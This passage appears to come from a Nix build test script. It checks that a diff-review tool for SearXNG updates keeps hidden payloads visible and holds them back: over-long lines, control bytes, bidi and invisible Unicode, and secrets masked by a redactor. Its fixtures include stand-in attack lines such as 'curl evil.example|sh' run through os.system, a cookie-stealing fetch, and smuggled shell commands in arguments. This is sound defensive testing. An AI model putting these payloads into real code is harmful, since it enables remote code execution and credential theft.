        { if (NR > 1) print cur; cur = $0 }
        END { print cur }' | cmp - "$1" || { echo "FAILED: the parts are not the file"; exit 1; }
      # read_file refuses a part as binary when its first 1000 bytes are
      # not UTF-8 (or hold NUL), and strips ESC ] ... BEL and fence markers
      python3 - "$1".part-* <<'PY' || exit 1
    import re, sys
    for p in sys.argv[1:]:
        b = open(p, "rb").read()
        # the head may end inside a character (read_file allows a cut in
        # its last 3 bytes); the whole part may not
        for what, chunk, cut in (("its first 1000 bytes", b[:1000], 3), ("the whole part", b, 0)):
            try:
                chunk.decode("utf-8")
            except UnicodeDecodeError as e:
                if e.start < len(chunk) - cut:
                    sys.exit(f"FAILED: {p}: {what} not UTF-8: {e}")
        if re.search(rb"[\x00-\x08\x0b-\x1f\x7f]", b) or b"__HERMES_FENCE_" in b:
            sys.exit(f"FAILED: {p}: a control byte or fence marker the file tool strips")
    PY
      nparts=$n
    }

    # the reviewer's repro (sxr4/lg): a payload at the end of a 3063
    # character line must be visible on some line of a part, whole
    sd=$TMPDIR/sxlong
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
    echo 'x=1' >"$sd/a/searx/engines/q.py"
    printf 'x = 1; y = "%s"; __import__("os").system("curl evil.example|sh")\n' "$(printf 'A%.0s' {1..3000})" >"$sd/b/searx/engines/q.py"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res"
    parts_ok "$sd/out"
    cat "$sd/out".part-* | grep -qF '__import__("os").system("curl evil.example|sh")' || {
      cat "$sd/out".part-*
      echo "FAILED: the long line's payload is not whole on one line of a part"
      exit 1
    }
    echo "ok: a 3063 character line folded under 2000, its payload visible"

    # the reviewer's repros (sxr4/u8, mb, bin): long lines of 2-byte
    # characters, the fold falling inside one at every offset; each part
    # must decode as UTF-8 (read_file refuses it as binary otherwise)
    sd=$TMPDIR/sxu8
    for pre in 0 1 2 1893 1894 1895 1896 1897; do
      rm -rf "$sd"
      mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
      echo 'x=1' >"$sd/a/searx/engines/q.py"
      printf 'x = "%s%s"\nPAYLOAD_U8 = 1\n' "$(head -c "$pre" /dev/zero | tr '\0' A)" "$(printf 'é%.0s' {1..3000})" >"$sd/b/searx/engines/q.py"
      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: UTF-8 held ($pre)"; exit 1; }
      parts_ok "$sd/out"
      cat "$sd/out".part-* | grep -qx '+PAYLOAD_U8 = 1' || { echo "FAILED: payload after the UTF-8 line lost ($pre)"; exit 1; }
    done
    # a 600 KB line of them: several parts, each one read
    printf 'x = "%s"\nPAYLOAD_BIN = 1\n' "$(printf 'é%.0s' {1..60000})" >"$sd/b/searx/engines/q.py"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res"
    parts_ok "$sd/out"
    [ "$nparts" -ge 2 ] || { echo "FAILED: a 600 KB line in $nparts part"; exit 1; }
    echo "ok: lines of multibyte characters folded on character boundaries ($nparts parts)"

    # the reviewer's repros (sxr4/osc, nul): read_file strips OSC
    # sequences (ESC ] ... BEL) and fence markers and refuses NUL: held
    # back, shown as \xNN; also any other C0 byte but TAB, DEL, a CR,
    # invalid UTF-8, in the code and the searx/data diff
    sd=$TMPDIR/sxctl
    sx_ctl() { # name file content(printf format) want
      rm -rf "$sd"
      mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines" "$sd/b/searx/data"
      echo 'x=1' >"$sd/a/searx/engines/q.py"
      echo 'x=1' >"$sd/b/searx/engines/q.py"
      # shellcheck disable=SC2059
      printf "$3" >"$sd/b/$2"
      rc=0
      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
      [ "$rc" = 3 ] && grep -q "^HOLD the $4" "$sd/res" || {
        cat "$sd/res"
        echo "FAILED: $1 not held back (exit $rc)"
        exit 1
      }
      parts_ok "$sd/out"
      grep -qF '# HELD BACK' "$sd/out" || { echo "FAILED: $1: the review file does not say it is held back"; exit 1; }
    }
    sx_ctl osc searx/engines/q.py 'x = "\033]"; __import__("os").system("curl evil.example|sh"); y = "\a"\nz = 2\n' 'code diff.s line [0-9]*: an escape sequence'
    grep -qF '+x = "\x1b]"; __import__("os").system("curl evil.example|sh"); y = "\x07"' "$sd/out".part-01 || {
      cat "$sd/out".part-01
      echo "FAILED: the OSC payload is not visible in the part"
      exit 1
    }
    sx_ctl nul searx/engines/q.py 'x = 1\nimport os; os.system("evil")  # \000\n' 'code diff.s line [0-9]*: a control byte 0x00'
    grep -qF '+import os; os.system("evil")  # \x00' "$sd/out".part-01 || { echo "FAILED: the NUL line is not visible"; exit 1; }
    sx_ctl bel searx/engines/q.py 'x = "\a"\n' 'code diff.s line [0-9]*: a control byte 0x07'
    sx_ctl cr searx/engines/q.py 'x = 1\r\nevil = 2\n' 'code diff.s line [0-9]*: a control byte 0x0d'
    sx_ctl del searx/engines/q.py 'x = "\177"\n' 'code diff.s line [0-9]*: a DEL byte'
    sx_ctl fence searx/engines/q.py 'x = "__HERMES_FENCE_abc__"; evil()\n' 'code diff.s line [0-9]*: a terminal fence marker'
    grep -qF '__HERMES\x5fFENCE_abc__' "$sd/out".part-01 || { echo "FAILED: the fence marker is not visible"; exit 1; }
    sx_ctl latin1 searx/engines/q.py 'x = "\351"\n' 'code diff.s line [0-9]*: invalid UTF-8 (\\xe9)'
    sx_ctl surrogate searx/engines/q.py 'x = "\355\240\200"\n' 'code diff.s line [0-9]*: invalid UTF-8'
    sx_ctl data-osc searx/data/e.json '{"u": "https://a.example/\033]0;x\a"}\n' 'data diff.s line [0-9]*: an escape sequence'
    # TAB and valid UTF-8 are fine
    rm -rf "$sd"
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
    echo 'x=1' >"$sd/a/searx/engines/q.py"
    printf 'x = "\tä€😀"\n' >"$sd/b/searx/engines/q.py"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: TAB/UTF-8 held back"; exit 1; }
    echo "ok: control bytes, escape sequences, fence markers and invalid UTF-8 held back, shown as \\xNN"

    # size: searx/data comes first after the code, and over 200 KB it is
    # held back (the review must see all of it); the other uncounted
    # diff is cut after 200 KB; the parts are one read each
    sd=$TMPDIR/sxsize
    mkdir -p "$sd/a/searx/data" "$sd/b/searx/data" "$sd/b/searx/engines" "$sd/b/searx/static"
    for i in $(seq 1 6000); do echo "\"k$i\": \"https://example.org/search?q={query}&n=$i\","; done >"$sd/b/searx/data/big.json"
    for i in $(seq 1 6000); do echo "\"node_modules/p$i\": {\"version\": \"1.0.$i\", \"resolved\": \"x\"},"; done >"$sd/b/searx/static/package-lock.json"
    for i in $(seq 1 3000); do echo "x$i = $i"; done >"$sd/b/searx/engines/many.py"
    head -c 200000 /dev/zero | tr '\0' 'a' >"$sd/b/searx/engines/long.py"
    echo >>"$sd/b/searx/engines/long.py"
    rc=0
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
    read -r lines bytes <"$sd/res"
    [ "$bytes" -gt 200000 ] && [ "$lines" -gt 3000 ] || { echo "FAILED: sizes $lines $bytes"; exit 1; }
    [ "$rc" = 3 ] && grep -q '^HOLD the searx/data diff is [0-9]* bytes, over ' "$sd/res" || {
      cat "$sd/res"
      echo "FAILED: a cut searx/data diff was not held back (exit $rc)"
      exit 1
    }
    grep -q "^# --- TRUNCATED: the searx/data diff's first 200000 bytes" "$sd/out" &&
      grep -q "^# --- TRUNCATED: the other uncounted diff's first 200000 bytes" "$sd/out" || {
      echo "FAILED: the uncounted diffs are not cut"
      exit 1
    }
    # searx/data right after the code, before package-lock.json
    order=$(grep -n -e '^# --- end of the code diff$' -e '^# --- the searx/data diff ' -e '^# --- the other uncounted diff ' "$sd/out" | cut -d: -f1 | paste -sd ' ')
    read -r o1 o2 o3 <<<"$order"
    [ "$o1" -lt "$o2" ] && [ "$o2" -lt "$o3" ] || { echo "FAILED: searx/data is not first after the code ($order)"; exit 1; }
    [ "$(wc -c <"$sd/out")" -lt $((bytes + 400000 + 20000)) ] || { echo "FAILED: the review file is too big"; exit 1; }
    parts_ok "$sd/out"
    [ "$nparts" -ge 3 ] || { echo "FAILED: only $nparts parts"; exit 1; }
    # the other uncounted diff alone over 200 KB: cut, not held
    rm "$sd/b/searx/data/big.json"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || {
      cat "$sd/res"
      echo "FAILED: a cut package-lock.json diff held back"
      exit 1
    }
    grep -q "^# --- TRUNCATED: the other uncounted diff's" "$sd/out" &&
      grep -q '^# --- end of the searx/data diff$' "$sd/out" || { echo "FAILED: package-lock.json not cut"; exit 1; }
    parts_ok "$sd/out"
    echo "ok: the searxng review file in $nparts readable parts; a cut searx/data diff held, the rest cut"

    # Round 7: every part goes through the reviewer's own read_file (the
    # hermes infra-space runs); whatever it shows differently is held.
    # The reviewer's probes: its secret redactor (private-key blocks,
    # inline keys, quoted --password/--api-key values, URL userinfo,
    # Bearer/JWT and ghp_ tokens). Key material is put together here, so
    # no literal key or token sits in the repo.
    sd=$TMPDIR/sxread
    pem_b="-----BEGIN RSA PRIV""ATE KEY-----"
    pem_e="-----END RSA PRIV""ATE KEY-----"
    ossh_b="-----BEGIN OPENSSH PRIV""ATE KEY-----"
    ossh_e="-----END OPENSSH PRIV""ATE KEY-----"
    body="MIIEowIBAAKCAQEA$(printf 'q%.0s' {1..60})"
    jwt="eyJhbGciOiJIUzI1NiJ9"".eyJzdWIiOiIxIn0"".abcdefghijklmnop"
    ghp="gh""p_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    sx_read() { # name file want(grep -E on the HOLD line); content on stdin
      rm -rf "$sd"
      mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines" "$sd/b/searx/static" "$sd/b/searx/data"
      echo 'x=1' >"$sd/a/searx/engines/q.py"
      echo 'x=1' >"$sd/b/searx/engines/q.py"
      cat >"$sd/b/$2"
      rc=0
      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
      [ "$rc" = 3 ] && grep -Eq "^HOLD $3" "$sd/res" || {
        cat "$sd/res"
        echo "FAILED: $1 not held back (exit $rc)"
        exit 1
      }
      # the reason never carries the hidden text
      if grep -qF -e "$body" -e "$ghp" -e "$jwt" -e 'pa55word' -e 'evil.example' "$sd/res"; then
        cat "$sd/res"
        echo "FAILED: $1: the HOLD reason quotes the secret or payload"
        exit 1
      fi
      grep -qF '# HELD BACK' "$sd/out" || { echo "FAILED: $1: the review file does not say it is held back"; exit 1; }
    }
    rp='the review part out\.part-01: line [0-9]+: read_file shows it with'
    printf 'KEY = """\n%s\n%s\n%s\n"""\nimport os; os.system("curl evil.example|sh")\n' "$pem_b" "$body" "$pem_e" |
      sx_read private-key-block searx/engines/k.py "$rp a secret redaction"
    printf 'K = "%s%s%s"; __import__("os").system("id")\n' "$ossh_b" "$body" "$ossh_e" |
      sx_read inline-key searx/engines/k.py "$rp a secret redaction"
    # shellcheck disable=SC2016
    printf '%s\n' 'subprocess.run("tool --password \"$(curl -s https://evil.example/x|sh)\"", shell=True)' |
      sx_read password searx/engines/k.py "$rp a secret redaction"
    printf '%s\n' "cmd = \"mysql --api-key 'abc; os.system(1)'\"" |
      sx_read api-key searx/engines/k.py "$rp a secret redaction"
    printf '%s\n' 'u = "https://user:pa55word@evil.example/"' |
      sx_read url-userinfo searx/engines/k.py "$rp a change"
    printf 'h = {"Authorization": "Bearer %s"}\n' "$jwt" |
      sx_read bearer searx/engines/k.py "$rp a change"
    printf 't = "%s"\n' "$ghp" |
      sx_read ghp-token searx/engines/k.py "$rp a secret redaction"
    # in searx/data too (not counted, but the review reads it)
    printf '{"u": "https://user:pa55word@evil.example/"}\n' |
      sx_read data-userinfo searx/data/e.json "$rp a change"
    # N2: a line separator in JavaScript ends the line there (the diff
    # shows one line); N3: bidi controls reorder what the review reads
    printf 'var a = 1;\xe2\x80\xa8fetch("https://evil.example/"+document.cookie)\n' |
      sx_read u2028-js searx/static/x.js 'the code diff.s line [0-9]+: a line separator U\+2028'
    grep -qF 'var a = 1;\u{2028}fetch(' "$sd/out".part-01 || { echo "FAILED: U+2028 not shown as \\u{2028}"; exit 1; }
    printf 'x = 1\nok = "admin\xe2\x80\xae \xe2\x81\xa6// check later\xe2\x81\xa9 \xe2\x81\xa6"\n' |
      sx_read rlo-bidi searx/engines/k.py 'the code diff.s line [0-9]+: a bidi control U\+202E'
    grep -qF 'ok = "admin\u{202E} \u{2066}// check later\u{2069} \u{2066}"' "$sd/out".part-01 || {
      echo "FAILED: bidi controls not shown as \\u{XXXX}"
      exit 1
    }
    echo "ok: read_file's redactions (key block, inline key, --password, --api-key, userinfo, Bearer, ghp_) held, reasons without the text; U+2028 and bidi controls in code held"

    # Round 8: code is ASCII, or visible characters NFKC leaves alone that
    # are not default-ignorable and not right-to-left; each is shown
    # followed by `\u{XXXX}`. Everything else non-ASCII holds.
    sx_code() { # name chars(printf format) U+XXXX
      rm -rf "$sd"
      mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
      echo 'x=1' >"$sd/a/searx/engines/q.py"
      # shellcheck disable=SC2059
      printf "x = \"a$2b\"; __import__(\"os\").system(\"curl evil.example|sh\")\n" >"$sd/b/searx/engines/q.py"
      rc=0
      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
      [ "$rc" = 3 ] && grep -q "^HOLD the code diff's line [0-9]*: a non-ASCII character $3 (" "$sd/res" || {
        cat "$sd/res"
        echo "FAILED: $1 ($3) in code not held back (exit $rc)"
        exit 1
      }
      grep -qF "+x = \"a\\u{''${3#U+}}" "$sd/out".part-01 || { cat "$sd/out".part-01; echo "FAILED: $1 not shown as \\u{XXXX}"; exit 1; }
      parts_ok "$sd/out"
    }
    sx_code zwsp '\xe2\x80\x8b' U+200B
    sx_code word-joiner '\xe2\x81\xa0' U+2060
    sx_code c1-nel '\xc2\x85' U+0085
    sx_code bom '\xef\xbb\xbf' U+FEFF
    sx_code soft-hyphen '\xc2\xad' U+00AD
    sx_code cgj '\xcd\x8f' U+034F
    sx_code hangul-filler '\xe3\x85\xa4' U+3164
    sx_code hangul-choseong-filler '\xe1\x85\x9f' U+115F
    sx_code mongolian-vs '\xe1\xa0\x8e' U+180E
    sx_code invisible-times '\xe2\x81\xa2' U+2062
    sx_code vs16 '\xef\xb8\x8f' U+FE0F
    sx_code tag-a '\xf3\xa0\x81\x81' U+E0041
    sx_code private-use '\xee\x80\x80' U+E000
    sx_code nbsp '\xc2\xa0' U+00A0
    sx_code ideographic-space '\xe3\x80\x80' U+3000
    sx_code fullwidth-a '\xef\xbd\x81' U+FF41
    sx_code one-dot-leader '\xe2\x80\xa4' U+2024
    sx_code micro-sign '\xc2\xb5' U+00B5
    sx_code hebrew-alef '\xd7\x90' U+05D0
    sx_code arabic-digit '\xd9\xa1' U+0661
    sx_code unassigned '\xf0\xaf\xa8\xa0' U+2FA20
    echo "ok: non-ASCII code characters held: invisible, default-ignorable, tags, fullwidth/NFKC lookalikes, spaces, right-to-left"
    # visible characters pass, each spelled out; a Cyrillic a in an
    # identifier reads `a\u{0430}`
    rm -rf "$sd"
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
    echo 'x=1' >"$sd/a/searx/engines/q.py"
    printf '# caf\xc3\xa9 \xe2\x80\x99 \xe2\x9c\x93 \xc3\x97 \xe5\x90\x89 e\xcc\x81\nb\xd0\xb0se_url = 1\n' >"$sd/b/searx/engines/q.py"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: visible non-ASCII in code held back"; exit 1; }
    # shellcheck disable=SC2016
    w1=$(printf '+# caf\xc3\xa9%s \xe2\x80\x99%s \xe2\x9c\x93%s \xc3\x97%s \xe5\x90\x89%s e\xcc\x81%s' '\u{00E9}' '\u{2019}' '\u{2713}' '\u{00D7}' '\u{5409}' '\u{0301}')
    w2=$(printf '+b\xd0\xb0%sse_url = 1' '\u{0430}')
    grep -qF -- "$w1" "$sd/out".part-01 && grep -qF -- "$w2" "$sd/out".part-01 || {
      cat "$sd/out".part-01
      echo "FAILED: visible non-ASCII in code not spelled out"
      exit 1
    }
    parts_ok "$sd/out"
    echo "ok: visible non-ASCII in code passes, spelled out as \\u{XXXX} after each"

    # searx/data and translations: non-ASCII passes, the invisible ones
    # (default-ignorable from Unicode's table, format, separators) shown
    # as \u{XXXX}; a ZWNJ in a Persian name too
    rm -rf "$sd"
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines" "$sd/b/searx/data" "$sd/b/searx/translations/fa"
    echo 'x=1' >"$sd/a/searx/engines/q.py"
    echo 'x=1' >"$sd/b/searx/engines/q.py"
    printf '{"fa": "\xd9\x85\xdb\x8c\xe2\x80\x8c\xd8\xae", "t": "a\xf3\xa0\x81\x81\xf3\xa0\x81\xbfb", "s": "c\xc2\xadd\xcd\x8fe\xe3\x85\xa4f\xe1\x85\xa0g\xe2\x81\xa1h\xef\xb8\x80i\xe2\x80\x8bj\xc2\x85k"}\n' >"$sd/b/searx/data/n.json"
    printf 'msgstr "\xe2\x81\xa4x\xe1\xa0\x8e"\n' >"$sd/b/searx/translations/fa/messages.po"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: data/translation characters held back"; exit 1; }
    for want in '\u{200C}' '"a\u{E0041}\u{E007F}b"' '"c\u{00AD}d\u{034F}e\u{3164}f\u{1160}g\u{2061}h\u{FE00}i\u{200B}j\u{0085}k"' '"\u{2064}x\u{180E}"'; do
      grep -qF -- "$want" "$sd/out".part-01 || { cat "$sd/out".part-01; echo "FAILED: data: $want not shown"; exit 1; }
    done
    parts_ok "$sd/out"
    echo "ok: searx/data and translations: tags, U+00AD, U+034F, Hangul fillers, U+2061-2064, variation selectors, ZWNJ shown as \\u{XXXX}"
    # a normal engine change (keys by name, requests, a URL) is not held
    rm -rf "$sd"
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
    printf 'base_url = "https://example.org"\n' >"$sd/a/searx/engines/e.py"
    cat >"$sd/b/searx/engines/e.py" <<'PY'
    base_url = "https://api.example.org/v2"
    api_key = ""


    def request(query, params):
        params["url"] = f"{base_url}/search?q={query}"
        params["headers"]["Authorization"] = "Bearer " + api_key
        params["headers"]["X-Api-Key"] = api_key
        return params
    PY
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: a normal engine diff held back"; exit 1; }
    # npm integrity hashes in package-lock.json hunks (uncounted) look
    # like tokens to hermes' redactor: exactly those lines are masked, the
    # header counts them; anything else the redactor changes holds
    integ='"integrity": "sha512-ezf+XEKeyJ2yYBhrzy1pVJxsAb4aLzR/WcAcBccb4RVDeFxsymjBve2LO0bpIMRUAiS90D4bUBRT0A=="'
    ihash=''${integ#*sha512-}
    ihash=''${ihash%\"}
    mkdir -p "$sd/b/client"
    printf '{\n  %s,\n  %s\n}\n' "$integ" "$integ" >"$sd/b/client/package-lock.json"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: a package-lock integrity hash held back"; exit 1; }
    grep -qxF '+  "integrity": "sha512-(masked, 80 characters)",' "$sd/out".part-01 &&
      grep -qxF '# package-lock.json integrity lines masked (npm hashes, nothing else): 2' "$sd/out".part-01 || {
      cat "$sd/out".part-01
      echo "FAILED: the integrity lines are not masked and counted"
      exit 1
    }
    sx_masked() { # name file content: not masked, held by the read check
      rm -rf "$sd/b/client"
      mkdir -p "$(dirname "$sd/b/$2")"
      printf '%s\n' "$3" >"$sd/b/$2"
      rc=0
      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
      [ "$rc" = 3 ] && grep -q '^HOLD the review part out.part-01: line [0-9]*: read_file shows it with' "$sd/res" &&
        grep -qxF '# package-lock.json integrity lines masked (npm hashes, nothing else): 0' "$sd/out" || {
        cat "$sd/res"
        echo "FAILED: $1: masked or not held (exit $rc)"
        exit 1
      }
      rm -f "$sd/b/$2"
    }
    # the reviewer's probes (rv8): code after the hash on the same line,
    # in package-lock.json and in a minified asset (a 24 KB line)
    sx_masked lock-trailing client/package-lock.json "  $integ, var x=1;fetch(\"//evil\")"
    sx_masked lock-prefix client/package-lock.json "  x=1; $integ"
    sx_masked lock-key client/package-lock.json "  \"integrity2\": \"sha512-$ihash\""
    sx_masked lock-sha1 client/package-lock.json "  \"integrity\": \"sha1-$ihash\""
    sx_masked min-js searx/static/app.min.js "!function(){$(printf 'var a=1;%.0s' {1..3000})fetch(\"https://evil.example/c?\"+document.cookie);var k=\"$ghp\";$integ}()"
    sx_masked min-js-integ searx/static/app.min.js "  $integ"
    sx_masked po searx/translations/de/messages.po "msgstr \"$integ\""
    # the same line in code still holds
    printf 'x = {%s}\n' "$integ" >"$sd/b/searx/engines/i.py"
    rc=0
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
    [ "$rc" = 3 ] && grep -q '^HOLD the review part out.part-01: line [0-9]*: read_file shows it with' "$sd/res" || {
      cat "$sd/res"
      echo "FAILED: a redacted line in code not held (exit $rc)"
      exit 1
    }
    # the read check leaves no scratch home behind
    if find "$TMPDIR" -maxdepth 1 -name 'searxng-readcheck-*' | grep -q .; then
      echo "FAILED: the read check left its scratch home"
      exit 1
    fi
    echo "ok: a normal engine diff passes; only package-lock integrity lines masked (counted), the rv8 min.js probe and other lookalikes held"
    touch $out
  ''
